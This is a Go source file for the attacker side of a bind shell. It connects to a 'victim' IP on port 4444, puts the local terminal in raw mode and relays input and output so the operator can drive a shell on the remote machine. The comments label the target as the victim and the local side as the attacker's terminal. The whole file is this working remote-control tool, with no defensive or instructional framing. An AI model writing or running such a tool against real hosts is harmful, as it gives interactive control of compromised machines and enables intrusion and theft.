package main

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"

	"golang.org/x/term"
)

func main() {
	// Define victim's IP and port
	victimIP := "localhost" // Replace with the victim's IP
	victimPort := "4444"     // Ensure this matches the server's listening port

	// Connect to the victim's server
	conn, err := net.Dial("tcp", victimIP+":"+victimPort)
	if err != nil {
		fmt.Println("Failed to connect to victim:", err)
		return
	}
	defer conn.Close()
	fmt.Println("Connected to victim")

	// Save the original terminal state and set the terminal to raw mode
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		fmt.Println("Failed to set terminal to raw mode:", err)
		return
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	// Handle termination signals to restore the terminal state
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		term.Restore(int(os.Stdin.Fd()), oldState)
		os.Exit(0)
	}()

	// Start goroutines to handle bidirectional communication
	go func() {
		// Copy data from server to attacker's terminal
		_, err := os.Stdout.ReadFrom(conn)
		if err != nil {
			fmt.Println("Error reading from connection:", err)
		}
	}()

	// Copy data from attacker's terminal to server
	_, err = os.Stdin.WriteTo(conn)
	if err != nil {
		fmt.Println("Error sending data to the server:", err)
	}
}
